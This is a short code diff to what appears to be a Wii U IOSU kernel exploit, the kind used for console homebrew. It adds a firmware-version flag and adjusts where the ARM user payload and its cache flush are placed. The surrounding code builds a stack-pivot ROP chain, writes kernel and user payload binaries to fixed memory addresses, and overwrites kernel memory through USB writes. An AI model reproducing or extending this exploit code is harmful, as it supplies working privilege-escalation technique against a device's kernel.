@@ -13,7 +13,7 @@ int USB_Write32(int fd, uint32_t *someOtherPointer, uint32_t addr, uint32_t valu
 
 }
 
-void WiiU::IOSU_Kernel::Exploit(int *confirm) {
+void WiiU::IOSU_Kernel::Exploit(bool are_we_on_555, int *confirm) {
 
 	/* Stack Pivot ROP Chain starts at 0x1016AD78 */
 	uint32_t *firstRopChain = (uint32_t*)0xF4120000;
@@ -237,9 +237,11 @@ void WiiU::IOSU_Kernel::Exploit(int *confirm) {
 	memcpy((void*)0xF5D00000, arm_kernel_bin, arm_kernel_bin_len);
 	DCFlushRange((void*)0xF5D00000, arm_kernel_bin_len);
 
+	*(uint32_t*)0xF4147FFC = are_we_on_555;
+
 	memcpy((void*)0xF4148004, arm_user_bin, arm_user_bin_len);
 	*(uint32_t*)0xF4148000 = arm_user_bin_len;
-	DCFlushRange((void*)0xF4148000, arm_user_bin_len + 4);
+	DCFlushRange((void*)0xF4147FFC, arm_user_bin_len + 8);
 
 	/* memcpy(0x1016AD78, pa_OurRopChain, 0x1C8) */
 	USB_Write32(fd, someOtherPointer, 0x1016AD40 + 0x14, 0x1016AD40 + 0x14 + 0x4 + 0x20);
